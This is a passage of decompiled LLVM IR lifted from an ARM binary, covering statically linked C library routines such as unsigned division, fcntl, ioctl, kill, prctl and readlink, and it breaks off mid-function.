  br i1 %v6_11edc, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_11ee0 = urem i32 %v1_11f08, 2
  %v4_11ee0 = icmp eq i32 %v3_11ee0, 0
  %v6_11ee0 = sub i32 %v1_11ee0, %v4_11edc
  store i32 %v6_11ee0, i32* %r0.global-to-local, align 4
  br i1 %v4_11ee0, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_11ee4 = udiv i32 %v1_11f04, 2
  %v6_11ee4 = or i32 %v1_11ee4, %v5_11ee4
  store i32 %v6_11ee4, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_11eec = phi i32 [ %v6_11ee0, %bb85 ], [ %v1_11ee0, %.thread7 ], [ %v6_11ee0, %bb86 ]
  %v1_11ef0 = phi i32 [ %v1_11ee4, %bb85 ], [ %v1_11ee4, %.thread7 ], [ %v6_11ee4, %bb86 ]
  %v4_11ee8 = udiv i32 %v1_11f08, 4
  %v6_11ee8 = icmp ult i32 %v1_11eec, %v4_11ee8
  br i1 %v6_11ee8, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_11eec = and i32 %v1_11f08, 2
  %v4_11eec = icmp eq i32 %v3_11eec, 0
  %v6_11eec = sub i32 %v1_11eec, %v4_11ee8
  store i32 %v6_11eec, i32* %r0.global-to-local, align 4
  br i1 %v4_11eec, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11ef0 = udiv i32 %v1_11f04, 4
  %v6_11ef0 = or i32 %v1_11ef0, %v5_11ef0
  store i32 %v6_11ef0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_11ef8 = phi i32 [ %v6_11eec, %bb87 ], [ %v1_11eec, %.thread8 ], [ %v6_11eec, %bb88 ]
  %v1_11efc = phi i32 [ %v1_11ef0, %bb87 ], [ %v1_11ef0, %.thread8 ], [ %v6_11ef0, %bb88 ]
  %v4_11ef4 = udiv i32 %v1_11f08, 8
  %v6_11ef4 = icmp ult i32 %v1_11ef8, %v4_11ef4
  br i1 %v6_11ef4, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11ef8 = and i32 %v1_11f08, 4
  %v4_11ef8 = icmp eq i32 %v3_11ef8, 0
  %v6_11ef8 = sub i32 %v1_11ef8, %v4_11ef4
  store i32 %v6_11ef8, i32* %r0.global-to-local, align 4
  br i1 %v4_11ef8, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11efc = udiv i32 %v1_11f04, 8
  %v6_11efc = or i32 %v1_11efc, %v5_11efc
  store i32 %v6_11efc, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_11f10 = phi i32 [ %v1_11efc, %bb89 ], [ %v1_11efc, %.thread9 ], [ %v6_11efc, %bb90 ]
  %v0_11f00 = phi i32 [ %v6_11ef8, %bb89 ], [ %v1_11ef8, %.thread9 ], [ %v6_11ef8, %bb90 ]
  %v2_11f00 = icmp eq i32 %v0_11f00, 0
  br i1 %v2_11f00, label %dec_label_pc_11f10, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_11f04, 16
  br i1 %tmp138, label %dec_label_pc_11f10, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_11f04 = udiv i32 %v1_11f04, 16
  %v4_11f08 = udiv i32 %v1_11f08, 16
  br label %dec_label_pc_11ed0

dec_label_pc_11f10:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_11f10, i32* %r0.global-to-local, align 4
  ret i32 %v0_11f10

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11e84
  %v9_11e84 = icmp eq i32 %v0_11e84, %v1_11e84
  %. = zext i1 %v9_11e84 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_11f24:                               ; preds = %dec_label_pc_11e8c
  %v2_11f24 = icmp ugt i32 %v1_11e84, 65535
  br i1 %v2_11f24, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_11f24
  %v2_11f28 = and i32 %v1_11e84, 32768
  %v3_11f28 = icmp eq i32 %v2_11f28, 0
  %v4_11f28 = udiv i32 %v1_11e84, 65536
  br i1 %v3_11f28, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_11f24
  %v0_11f3465 = phi i32 [ %v1_11e84, %dec_label_pc_11f24 ], [ %v4_11f28, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_11f38 = phi i32 [ %v0_11f3465, %.thread16 ], [ %v4_11f28, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_11f34 = icmp ugt i32 %v1_11f38, 255
  br i1 %v2_11f34, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_11f38 = and i32 %v1_11f38, 128
  %v3_11f38 = icmp eq i32 %v2_11f38, 0
  %v4_11f38 = udiv i32 %v1_11f38, 256
  br i1 %v3_11f38, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_11f3c = or i32 %storemerge, 8
  store i32 %v2_11f3c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_11f48 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_11f3c, %bb98 ]
  %v1_11f44 = phi i32 [ %v1_11f38, %bb96 ], [ %v4_11f38, %bb97 ], [ %v4_11f38, %bb98 ]
  %v2_11f40 = icmp ugt i32 %v1_11f44, 15
  br i1 %v2_11f40, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_11f44 = and i32 %v1_11f44, 8
  %v3_11f44 = icmp eq i32 %v2_11f44, 0
  %v4_11f44 = udiv i32 %v1_11f44, 16
  br i1 %v3_11f44, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11f48 = add nsw i32 %v1_11f48, 4
  store i32 %v2_11f48, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_11f50 = phi i32 [ %v1_11f48, %.thread17 ], [ %v1_11f48, %bb99 ], [ %v2_11f48, %bb100 ]
  %v5_11f54 = phi i32 [ %v1_11f44, %.thread17 ], [ %v4_11f44, %bb99 ], [ %v4_11f44, %bb100 ]
  %v2_11f4c = icmp ugt i32 %v5_11f54, 3
  %v7_11f4c = icmp eq i32 %v5_11f54, 4
  %v2_11f50 = xor i1 %v7_11f4c, true
  %v3_11f50 = and i1 %v2_11f4c, %v2_11f50
  br i1 %v3_11f50, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_11f50 = add nsw i32 %v4_11f50, 3
  store i32 %v5_11f50, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_11f54 = phi i32 [ %v4_11f50, %.thread18 ], [ %v5_11f50, %bb101 ]
  %v2_11f54 = xor i1 %v2_11f4c, true
  %v3_11f54 = or i1 %v7_11f4c, %v2_11f54
  br i1 %v3_11f54, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_11f54 = udiv i32 %v5_11f54, 2
  %v9_11f54 = add i32 %v4_11f54, %v8_11f54
  store i32 %v9_11f54, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_11f58 = phi i32 [ %v4_11f54, %bb102 ], [ %v9_11f54, %bb103 ]
  %v6_11f58 = lshr i32 %v0_11e84, %v1_11f58
  store i32 %v6_11f58, i32* %r0.global-to-local, align 4
  ret i32 %v6_11f58

dec_label_pc_11f60:                               ; preds = %entry
  %v0_11f64 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11f54, { 1, 0 }
  uselistorder i1 %v7_11f4c, { 1, 0 }
  uselistorder i32 %v4_11f44, { 1, 0 }
  uselistorder i32 %v1_11f44, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11f3c, { 1, 0 }
  uselistorder i32 %v4_11f38, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11f38, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11f28, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11f00, { 1, 0 }
  uselistorder i32 %v0_11f10, { 1, 0, 2 }
  uselistorder i32 %v4_11ef4, { 1, 0 }
  uselistorder i32 %v1_11efc, { 1, 2, 0 }
  uselistorder i32 %v4_11ee8, { 1, 0 }
  uselistorder i32 %v1_11ef0, { 1, 2, 0 }
  uselistorder i32 %v4_11edc, { 1, 0 }
  uselistorder i32 %v1_11ee4, { 1, 2, 0 }
  uselistorder i32 %v1_11f08, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11ed8, { 1, 0 }
  uselistorder i32 %v1_11f04, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11ec4, { 1, 0 }
  uselistorder i32 %v3_11ec0, { 1, 0 }
  uselistorder i32 %v1_11ec0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11ec4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11eb0, { 1, 0 }
  uselistorder i32 %v4_11eac, { 2, 1, 0 }
  uselistorder i32 %v1_11eb0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11eb8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_11e84, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_11e84, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_11e78, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 52, 2, 28, 53, 27, 54, 25, 55, 26, 56, 57, 10, 58, 3, 59, 60, 32, 61, 31, 62, 29, 63, 30, 64, 12, 11, 65, 66, 33, 67, 34, 68, 14, 13, 69, 70, 35, 71, 36, 72, 15, 16, 4, 5, 23, 22, 38, 73, 37, 74, 17, 18, 6, 39, 75, 40, 76, 77, 78, 19, 79, 80, 7, 41, 81, 42, 82, 43, 83, 84, 85, 20, 86, 87, 8, 46, 88, 44, 89, 45, 90, 91, 21, 92, 24, 47, 93, 48, 94, 49, 95, 96, 97, 50, 98, 99, 100, 101, 51, 102, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11f10, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11ecc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11eb8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11f78 = udiv i32 %arg1, %arg2
  ret i32 %v2_11f78
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_11f94 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_11f94
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_11fb0 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_11fb0, 2
  br i1 %tmp, label %dec_label_pc_11fec, label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_12020, label %dec_label_pc_11fdc

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fc8
  %v0_11fe0 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12014

dec_label_pc_11fec:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_12008, label %dec_label_pc_12020

dec_label_pc_12008:                               ; preds = %dec_label_pc_11fec
  %v0_1200c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %dec_label_pc_11fdc, %dec_label_pc_12008
  %storemerge2 = phi i32 [ %v0_11fe0, %dec_label_pc_11fdc ], [ %v0_1200c, %dec_label_pc_12008 ]
  %storemerge.in = load i16, i16* @global_var_23068.362, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_12014 = load i32, i32* %r2.global-to-local, align 4
  %v1_12014 = sub i32 0, %v0_12014
  store i32 %v1_12014, i32* %r2.global-to-local, align 4
  %v3_12018 = add i32 %storemerge, %storemerge2
  %v4_12018 = inttoptr i32 %v3_12018 to i32*
  store i32 %v1_12014, i32* %v4_12018, align 4
  br label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %dec_label_pc_11fc8, %dec_label_pc_11fec, %dec_label_pc_12014
  %storemerge1 = phi i32 [ -1, %dec_label_pc_12014 ], [ %arg1, %dec_label_pc_11fec ], [ %arg1, %dec_label_pc_11fc8 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_12020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12014, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_12038 = load i32, i32* @r2, align 4
  %v9_12038 = load i32, i32* @r3, align 4
  store i32 %v9_12038, i32* %stack_var_-4, align 4
  %v3_1203c = load i32, i32* @r4, align 4
  store i32 %v3_1203c, i32* %stack_var_-32, align 4
  %v6_1203c = load i32, i32* @r5, align 4
  %v12_1203c = load i32, i32* @r7, align 4
  %v4_1204c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  %v2_12054 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12054, i32* @r3, align 4
  %v2_12058 = icmp eq i32 %v4_1204c, 0
  %v0_12060 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12060, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_12038, i32* @r4, align 4
  br i1 %v2_12058, label %dec_label_pc_1207c, label %dec_label_pc_12070

dec_label_pc_12070:                               ; preds = %entry
  %v7_12070 = icmp eq i32 %arg2, 7
  br i1 %v7_12070, label %dec_label_pc_120bc, label %bb

bb:                                               ; preds = %dec_label_pc_12070
  %v8_12074 = icmp eq i32 %arg2, 14
  br i1 %v8_12074, label %dec_label_pc_120bc, label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_12060, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_12060, -4095
  br i1 %tmp, label %dec_label_pc_120b4, label %dec_label_pc_1209c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_1207c
  %v0_120a0 = call i32 @__aeabi_read_tp()
  %v3_120a4 = load i16, i16* @global_var_23068.362, align 2
  %v4_120a4 = sext i16 %v3_120a4 to i32
  store i32 %v4_120a4, i32* @r3, align 4
  %v0_120a8 = load i32, i32* @r2, align 4
  %v1_120a8 = sub i32 0, %v0_120a8
  store i32 %v1_120a8, i32* @r2, align 4
  %v3_120ac = add i32 %v4_120a4, %v0_120a0
  %v4_120ac = inttoptr i32 %v3_120ac to i32*
  store i32 %v1_120a8, i32* %v4_120ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120b4

dec_label_pc_120b4:                               ; preds = %dec_label_pc_1207c, %dec_label_pc_1209c
  %v0_120b4 = phi i32 [ %v0_12060, %dec_label_pc_1207c ], [ -1, %dec_label_pc_1209c ]
  br label %dec_label_pc_12108

dec_label_pc_120bc:                               ; preds = %dec_label_pc_12070, %bb
  %v0_120bc = call i32 @__libc_enable_asynccancel()
  %v0_120c0 = load i32, i32* @r7, align 4
  store i32 %v0_120c0, i32* @r1, align 4
  store i32 %v0_120bc, i32* %r6.global-to-local, align 4
  %v0_120cc = load i32, i32* @r5, align 4
  store i32 %v0_120cc, i32* %r0.global-to-local, align 4
  store i32 %v0_120cc, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_120cc, -4095
  br i1 %tmp15, label %dec_label_pc_120fc, label %dec_label_pc_120e4

dec_label_pc_120e4:                               ; preds = %dec_label_pc_120bc
  %v1_120e8 = sub i32 0, %v0_120cc
  %v0_120ec = call i32 @__aeabi_read_tp()
  store i32 %v0_120ec, i32* %r0.global-to-local, align 4
  %v3_120f0 = load i16, i16* @global_var_23068.362, align 2
  %v4_120f0 = sext i16 %v3_120f0 to i32
  store i32 %v4_120f0, i32* @r3, align 4
  %v3_120f4 = add i32 %v4_120f0, %v0_120ec
  %v4_120f4 = inttoptr i32 %v3_120f4 to i32*
  store i32 %v1_120e8, i32* %v4_120f4, align 4
  store i32 -1, i32* @r2, align 4
  %v0_120fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_120fc

dec_label_pc_120fc:                               ; preds = %dec_label_pc_120bc, %dec_label_pc_120e4
  %v0_12100 = phi i32 [ %v0_120cc, %dec_label_pc_120bc ], [ -1, %dec_label_pc_120e4 ]
  %v0_120fc = phi i32 [ %v0_120bc, %dec_label_pc_120bc ], [ %v0_120fc.pre, %dec_label_pc_120e4 ]
  store i32 %v0_120fc, i32* %r0.global-to-local, align 4
  store i32 %v0_12100, i32* @r7, align 4
  %v1_12104 = call i32 @__libc_disable_asynccancel(i32 %v0_120fc)
  store i32 %v1_12104, i32* %r0.global-to-local, align 4
  %v0_12108.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12108

dec_label_pc_12108:                               ; preds = %dec_label_pc_120b4, %dec_label_pc_120fc
  %v0_12108 = phi i32 [ %v0_120b4, %dec_label_pc_120b4 ], [ %v0_12108.pre, %dec_label_pc_120fc ]
  store i32 %v0_12108, i32* %r0.global-to-local, align 4
  %v2_12110 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12110, i32* @r4, align 4
  store i32 %v6_1203c, i32* @r5, align 4
  store i32 %v12_1203c, i32* @r7, align 4
  ret i32 %v0_12108

; uselistorder directives
  uselistorder i32 %v0_12108, { 1, 0 }
  uselistorder i32 %v0_120fc, { 1, 0 }
  uselistorder i32 %v0_120cc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12060, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_12108, { 1, 0 }
  uselistorder label %dec_label_pc_120fc, { 1, 0 }
  uselistorder label %dec_label_pc_120bc, { 1, 0 }
  uselistorder label %dec_label_pc_120b4, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_1213c = load i32, i32* @r0, align 4
  ret i32 %v1_1213c
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_12140 = load i32, i32* @r3, align 4
  store i32 %v9_12140, i32* %stack_var_-4, align 4
  %v3_12144 = load i32, i32* @r4, align 4
  store i32 %v3_12144, i32* %stack_var_-32, align 4
  %v6_12144 = load i32, i32* @r5, align 4
  %v12_12144 = load i32, i32* @r7, align 4
  %v4_12154 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  %v2_1215c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1215c, i32* @r3, align 4
  %v2_12160 = icmp eq i32 %v4_12154, 0
  %v0_12168 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12168, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_12160, label %dec_label_pc_12178, label %dec_label_pc_121b0

dec_label_pc_12178:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_12168, -4095
  br i1 %tmp, label %dec_label_pc_121a8, label %dec_label_pc_12190

dec_label_pc_12190:                               ; preds = %dec_label_pc_12178
  %v1_12194 = sub i32 0, %v0_12168
  %v3_12198 = load i16, i16* @global_var_23068.362, align 2
  %v4_12198 = sext i16 %v3_12198 to i32
  store i32 %v4_12198, i32* @r3, align 4
  %v0_1219c = call i32 @__aeabi_read_tp()
  %v2_121a0 = load i32, i32* @r3, align 4
  %v3_121a0 = add i32 %v2_121a0, %v0_1219c
  %v4_121a0 = inttoptr i32 %v3_121a0 to i32*
  store i32 %v1_12194, i32* %v4_121a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_121a8

dec_label_pc_121a8:                               ; preds = %dec_label_pc_12178, %dec_label_pc_12190
  %v0_121a8 = phi i32 [ %v0_12168, %dec_label_pc_12178 ], [ -1, %dec_label_pc_12190 ]
  br label %dec_label_pc_121fc

dec_label_pc_121b0:                               ; preds = %entry
  %v0_121b0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_121b0, i32* %r6.global-to-local, align 4
  %v0_121c0 = load i32, i32* @r4, align 4
  store i32 %v0_121c0, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_121c0, -4095
  br i1 %tmp15, label %dec_label_pc_121f0, label %dec_label_pc_121d8

dec_label_pc_121d8:                               ; preds = %dec_label_pc_121b0
  %v1_121dc = sub i32 0, %v0_121c0
  %v3_121e0 = load i16, i16* @global_var_23068.362, align 2
  %v4_121e0 = sext i16 %v3_121e0 to i32
  store i32 %v4_121e0, i32* @r3, align 4
  %v0_121e4 = call i32 @__aeabi_read_tp()
  store i32 %v0_121e4, i32* %r0.global-to-local, align 4
  %v2_121e8 = load i32, i32* @r3, align 4
  %v3_121e8 = add i32 %v2_121e8, %v0_121e4
  %v4_121e8 = inttoptr i32 %v3_121e8 to i32*
  store i32 %v1_121dc, i32* %v4_121e8, align 4
  %v0_121f0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_121f0

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121b0, %dec_label_pc_121d8
  %v0_121f4 = phi i32 [ %v0_121c0, %dec_label_pc_121b0 ], [ -1, %dec_label_pc_121d8 ]
  %v0_121f0 = phi i32 [ %v0_121b0, %dec_label_pc_121b0 ], [ %v0_121f0.pre, %dec_label_pc_121d8 ]
  store i32 %v0_121f0, i32* %r0.global-to-local, align 4
  store i32 %v0_121f4, i32* @r7, align 4
  %v1_121f8 = call i32 @__libc_disable_asynccancel(i32 %v0_121f0)
  store i32 %v1_121f8, i32* %r0.global-to-local, align 4
  %v0_121fc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_121fc

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121a8, %dec_label_pc_121f0
  %v0_121fc = phi i32 [ %v0_121a8, %dec_label_pc_121a8 ], [ %v0_121fc.pre, %dec_label_pc_121f0 ]
  store i32 %v0_121fc, i32* %r0.global-to-local, align 4
  %v2_12204 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12204, i32* @r4, align 4
  store i32 %v6_12144, i32* @r5, align 4
  store i32 %v12_12144, i32* @r7, align 4
  ret i32 %v0_121fc

; uselistorder directives
  uselistorder i32 %v0_121fc, { 1, 0 }
  uselistorder i32 %v0_121f0, { 1, 0 }
  uselistorder i32 %v0_121c0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12168, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_121fc, { 1, 0 }
  uselistorder label %dec_label_pc_121f0, { 1, 0 }
  uselistorder label %dec_label_pc_121a8, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12220 = load i32, i32* @r7, align 4
  store i32 %v3_12220, i32* %stack_var_-8, align 4
  %v0_1222c = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1222c, -4095
  br i1 %tmp, label %dec_label_pc_1224c, label %dec_label_pc_12234

dec_label_pc_12234:                               ; preds = %entry
  %v1_12238 = sub i32 0, %v0_1222c
  %v3_1223c = load i16, i16* @global_var_23068.362, align 2
  %v4_1223c = sext i16 %v3_1223c to i32
  %v0_12240 = call i32 @__aeabi_read_tp()
  %v3_12244 = add i32 %v4_1223c, %v0_12240
  %v4_12244 = inttoptr i32 %v3_12244 to i32*
  store i32 %v1_12238, i32* %v4_12244, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1224c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1224c

dec_label_pc_1224c:                               ; preds = %entry, %dec_label_pc_12234
  %v1_12250 = phi i32 [ %v0_1222c, %entry ], [ -1, %dec_label_pc_12234 ]
  %v2_1224c = phi i32 [ %v3_12220, %entry ], [ %v2_1224c.pre, %dec_label_pc_12234 ]
  store i32 %v2_1224c, i32* @r7, align 4
  ret i32 %v1_12250

; uselistorder directives
  uselistorder i32 %v0_1222c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1224c, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12258 = load i32, i32* @r4, align 4
  store i32 %v3_12258, i32* %stack_var_-12, align 4
  %v0_12268 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12268, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12268, -4095
  br i1 %tmp, label %dec_label_pc_12290, label %dec_label_pc_12278

dec_label_pc_12278:                               ; preds = %entry
  %v0_1227c = call i32 @__aeabi_read_tp()
  %v3_12280 = load i16, i16* @global_var_23068.362, align 2
  %v4_12280 = sext i16 %v3_12280 to i32
  %v0_12284 = load i32, i32* %r2.global-to-local, align 4
  %v1_12284 = sub i32 0, %v0_12284
  store i32 %v1_12284, i32* %r2.global-to-local, align 4
  %v3_12288 = add i32 %v4_12280, %v0_1227c
  %v4_12288 = inttoptr i32 %v3_12288 to i32*
  store i32 %v1_12284, i32* %v4_12288, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12290.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12290

dec_label_pc_12290:                               ; preds = %entry, %dec_label_pc_12278
  %v1_12294 = phi i32 [ %v0_12268, %entry ], [ -1, %dec_label_pc_12278 ]
  %v2_12290 = phi i32 [ %v3_12258, %entry ], [ %v2_12290.pre, %dec_label_pc_12278 ]
  store i32 %v2_12290, i32* @r4, align 4
  ret i32 %v1_12294

; uselistorder directives
  uselistorder i32 %v0_12268, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12290, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1229c = load i32, i32* @r7, align 4
  store i32 %v3_1229c, i32* %stack_var_-8, align 4
  %v0_122a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122a8, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_122a8, -4095
  br i1 %tmp, label %dec_label_pc_122d0, label %dec_label_pc_122b8

dec_label_pc_122b8:                               ; preds = %entry
  %v0_122bc = call i32 @__aeabi_read_tp()
  %v3_122c0 = load i16, i16* @global_var_23068.362, align 2
  %v4_122c0 = sext i16 %v3_122c0 to i32
  store i32 %v4_122c0, i32* @r3, align 4
  %v0_122c4 = load i32, i32* @r2, align 4
  %v1_122c4 = sub i32 0, %v0_122c4
  store i32 %v1_122c4, i32* @r2, align 4
  %v3_122c8 = add i32 %v4_122c0, %v0_122bc
